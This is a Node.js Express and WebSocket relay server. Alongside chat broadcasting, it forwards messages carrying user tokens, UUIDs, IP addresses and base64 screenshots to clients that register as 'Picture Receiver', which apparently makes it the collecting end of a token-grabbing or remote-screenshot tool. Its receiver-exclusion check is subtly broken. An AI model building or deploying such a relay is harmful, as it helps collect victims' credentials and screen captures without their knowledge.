const http = require("http");
const express = require("express");
const WebSocket = require("ws");

const app = express();
app.use(express.static("public"));

const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

const usersInChat = new Map();
const pictureReceivers = new Map();
let keepAliveId;

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

wss.on("connection", function (ws) {
    const userID = generateUniqueID();
    
    ws.on("message", (data, isBinary) => {
        try {
            if (isBinary) {
                handleBinaryMessage(ws, data, userID);
            } else {
                handleTextMessage(ws, data, userID);
            }
        } catch (error) {
            console.error('Error handling message:', error);
            sendErrorMessage(ws, 'Error processing message');
        }
    });

    ws.on("close", () => {
        try {
            handleDisconnect(userID);
        } catch (error) {
            console.error('Error handling disconnect:', error);
        }
    });

    ws.on("error", (error) => {
        console.error('WebSocket error:', error);
        if (error.code === 'WS_ERR_INVALID_UTF8') {
            sendErrorMessage(ws, 'Invalid UTF-8 sequence received');
            // Optionally close the connection
            // ws.close(1007, 'Invalid UTF-8 sequence');
        }
    });
    
    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }
});

wss.on("close", () => {
    clearInterval(keepAliveId);
    keepAliveId = null;
});

function generateUniqueID() {
    return Math.random().toString(36).substr(2, 9);
}

function handleTextMessage(ws, data, userID) {
    let messageData;
    try {
        messageData = JSON.parse(data);
    } catch (error) {
        console.error('Error parsing message data:', error);
        sendErrorMessage(ws, 'Invalid JSON format');
        return;
    }

    if (!isValidMessageData(messageData)) {
        console.error('Invalid message data:', messageData);
        sendErrorMessage(ws, 'Invalid message structure');
        return;
    }
    
    if (isPictureData(messageData)) {
        broadcastToPictureReceivers(messageData);
    } else if (messageData.command === 'Picture Receiver') {
        pictureReceivers.set(userID, ws);
    } else if (isScreenshotData(messageData)) {
        broadcastToPictureReceivers({
            type: 'screenshot',
            action: messageData.action,
            screen: messageData.screen,
            data: messageData.data
        });
    } else {
        broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
    }
}

function handleBinaryMessage(ws, data, userID) {
    // Handle binary data here if needed
    console.log('Received binary data from', userID);
}

function isValidMessageData(data) {
    return typeof data === 'object' && data !== null;
}

function isPictureData(data) {
    return data.sender && data.token && data.uuid && data.ip;
}

function isScreenshotData(data) {
    return (data.type === 'screenshot' && typeof data.data === 'string' && data.data.startsWith('data:image/png;base64')) ||
           (data.action === 'screenshot_result');
}

function broadcastToPictureReceivers(message) {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        sendMessage(ws, data);
    });
}

function broadcastToAllExceptPictureReceivers(senderWs, message, includeSelf) {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && (includeSelf || client !== senderWs)) {
            sendMessage(client, message);
        }
    });
}

function sendMessage(ws, message) {
    if (ws.readyState === WebSocket.OPEN) {
        ws.send(message, error => {
            if (error) console.error("Error sending message:", error);
        });
    }
}

function sendErrorMessage(ws, errorMessage) {
    sendMessage(ws, JSON.stringify({ type: 'error', message: errorMessage }));
}

function handleDisconnect(userID) {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
}

function keepServerAlive() {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(null, false, error => {
                    if (error) console.error("Error sending ping:", error);
                });
            }
        });
    }, 30000);
}

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
